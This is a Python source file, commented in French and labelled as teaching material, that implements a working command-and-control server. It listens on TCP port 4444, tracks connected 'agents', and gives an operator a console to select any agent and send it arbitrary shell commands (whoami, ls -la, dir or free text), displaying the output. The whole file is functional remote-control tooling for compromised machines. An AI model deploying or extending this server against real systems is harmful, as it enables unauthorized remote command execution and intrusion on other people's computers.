import socket
import threading
import queue

class C2Server:
    def __init__(self, host='127.0.0.1', port=4444):
        """
        Initialise le serveur C2 (pédagogique).
        - host : adresse IP d’écoute (par défaut localhost)
        - port : port TCP sur lequel le serveur écoute
        """
        # Initialisation des paramètres de l'adresse IP et du port du serveur
        self.host = host
        self.port = port

        # Dictionnaire pour stocker les connexions des agents et leur socket
        self.agents = {}         # {agent_id: socket}

        # Dictionnaire pour stocker les queues de chaque agent, permettant de récupérer leurs messages
        self.queues = {}         # {agent_id: Queue}

        # Création du socket serveur pour la communication TCP
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Permet de réutiliser l'adresse et le port rapidement après un redémarrage du serveur
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Lock pour protéger l’accès concurrent aux agents
        self.lock = threading.Lock()

        # Mapping des raccourcis -> commande envoyée au client (ex: "whoami", "listfiles")
        self.shortcuts = {
            "whoami": "whoami",        # Raccourci pour obtenir le nom d'utilisateur
            "listfiles": "ls -la",     # Raccourci pour lister les fichiers sous Unix
            "pwd": "pwd",              # Raccourci pour afficher le répertoire actuel
        }

    def start(self):
        """Démarre le serveur et accepte les connexions entrantes."""
        try:
            # Lier le socket au port et à l'adresse IP
            self.server_socket.bind((self.host, self.port))
            # Le serveur écoute jusqu'à 5 connexions en attente
            self.server_socket.listen(5)
            print(f"[+] Serveur C2 en écoute sur {self.host}:{self.port}")

            # Thread pour le prompt principal (interface de commande du serveur)
            threading.Thread(target=self.prompt, daemon=True).start()

            # Boucle principale pour accepter les connexions des agents
            while True:
                # Accepte une connexion entrante
                client_socket, addr = self.server_socket.accept()
                # Création d'un identifiant unique pour chaque agent basé sur son IP et son port
                agent_id = f"{addr[0]}:{addr[1]}"
                # Ajoute l'agent à la liste des agents avec sa socket
                self.agents[agent_id] = client_socket
                # Crée une nouvelle queue pour stocker les messages de cet agent
                self.queues[agent_id] = queue.Queue()
                print(f"[+] Nouvel agent connecté : {agent_id}")

                # Thread pour gérer la communication avec cet agent
                threading.Thread(target=self.handle_client, args=(client_socket, agent_id), daemon=True).start()

        except Exception as e:
            print(f"[!] Erreur : {e}")
            # Ferme le socket du serveur en cas d'erreur
            self.server_socket.close()
            print("[!] Serveur fermé.")

    def handle_client(self, client_socket, agent_id):
        """
        Reçoit les messages de l'agent et les stocke dans la queue correspondante.
        """
        try:
            while True:
                # Reçoit des données depuis l'agent
                data = client_socket.recv(4096).decode(errors="ignore")
                if not data:
                    break  # Si aucun message n'est reçu, on arrête la connexion

                # Stocke le message dans la queue de cet agent et l'affiche
                self.queues[agent_id].put(data)
                print(f"[{agent_id}] {data.strip()}")
        except Exception as e:
            print(f"[!] Erreur avec {agent_id}: {e}")
        finally:
            # Nettoyage après la déconnexion de l'agent
            print(f"[-] Agent déconnecté : {agent_id}")
            client_socket.close()
            # Supprime l'agent des dictionnaires une fois déconnecté
            if agent_id in self.agents:
                del self.agents[agent_id]
            if agent_id in self.queues:
                del self.queues[agent_id]

    def prompt(self):
        """
        Affiche le prompt principal côté serveur pour interagir avec les agents.
        """
        while True:
            try:
                # Attend l'entrée d'une commande dans le terminal
                cmd = input("C2> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd == "list":
                # Affiche la liste des agents connectés
                print("Agents connectés :")
                for agent_id in self.agents:
                    print(f" - {agent_id}")

            elif cmd.startswith("use "):
                # Permet de sélectionner un agent à contrôler via son identifiant
                _, agent_id = cmd.split(maxsplit=1)
                if agent_id in self.agents:
                    print(f"[+] Vous contrôlez maintenant {agent_id}. Tapez 'exit' pour revenir au menu principal.")
                    self.agent_prompt(agent_id)
                else:
                    print("[!] Agent introuvable")

            elif cmd == "help":
                # Affiche les commandes disponibles pour l'utilisateur
                print("Commandes du prompt principal :")
                print("  list                      -> liste les agents connectés")
                print("  use <agent_id>            -> passe en sous-prompt pour contrôler un agent")
                print("  exit                      -> ferme le serveur proprement")
                print("\nRaccourcis disponibles (utilisables dans le sous-prompt d'agent) :")
                for k in self.shortcuts:
                    print(f"  {k}")
                print("Exemples dans l'agent prompt :")
                print("  whoami")
                print("  listfiles        (par défaut envoie 'ls -la' ; pour Windows: 'listfiles win')")
                print("  listfiles win    (envoie 'dir' au lieu de 'ls -la')")
                print("  pwd")
                print("  screenshot       (nécessite support côté client)")
                print("  exit             -> revient au prompt principal")

            elif cmd == "exit":
                # Ferme toutes les connexions et arrête le serveur
                print("[!] Fermeture du serveur...")
                for s in list(self.agents.values()):
                    try:
                        s.close()
                    except:
                        pass
                try:
                    self.server_socket.close()
                except:
                    pass
                break

            else:
                print("Commandes disponibles : list, use <agent_id>, help, exit")

    def agent_prompt(self, agent_id):
        """
        Sous-prompt pour un agent sélectionné.
        On traduit les raccourcis en commandes shell envoyées au client.
        """
        sock = self.agents.get(agent_id)
        q = self.queues.get(agent_id)

        if not sock or not q:
            print("[!] Socket ou queue manquante pour cet agent.")
            return

        while True:
            try:
                # Attente d'une commande de l'utilisateur pour l'agent sélectionné
                cmd = input(f"{agent_id}> ").strip()
            except (EOFError, KeyboardInterrupt):
                cmd = "exit"

            if cmd.lower() == "exit":
                break
            if not cmd:
                continue

            # Gestion des variantes, ex: "listfiles win"
            parts = cmd.split()
            base = parts[0].lower()

            # Déterminer la commande réelle à envoyer selon le raccourci
            if base in self.shortcuts:
                if base == "listfiles" and len(parts) > 1 and parts[1].lower().startswith("win"):
                    cmd_to_send = "dir"  # Si spécifié "win", utilise la commande Windows 'dir'
                else:
                    cmd_to_send = self.shortcuts[base]
            else:
                # Envoie la commande telle quelle si ce n'est pas un raccourci
                cmd_to_send = cmd

            # Ajoute un saut de ligne pour séparer la commande (utile si le client fait .strip())
            payload = cmd_to_send + "\n"
            try:
                sock.sendall(payload.encode())  # Envoie la commande au client
            except Exception as e:
                print(f"[!] Erreur en envoyant la commande : {e}")
                break

            # Attends la réponse du client
            collected = False
            try:
                # Attend jusqu'à 2s pour une première réponse
                response = q.get(timeout=2.0)
                print(response.strip())
                collected = True
            except queue.Empty:
                # Aucune réponse immédiate
                pass

            # Vide la queue sans bloquer
            while True:
                try:
                    response = q.get_nowait()
                    print(response.strip())
                    collected = True
                except queue.Empty:
                    break

            if not collected:
                # Si aucune sortie n'est arrivée, on affiche une info
                print("[!] Aucun retour reçu immédiatement. La commande peut être en cours d'exécution ou le client ne renvoie pas de sortie.")

if __name__ == "__main__":
    # Demande de l'IP à l'utilisateur
    host = input("Entrez l'adresse IP d'écoute (par défaut 127.0.0.1) : ")

    # Si aucune IP n'est entrée, on ferme la socket et arrête le programme
    if not host:
        print("[!] Aucune adresse IP fournie. Fermeture du serveur.")
        exit()

    server = C2Server(host=host)
    server.start()
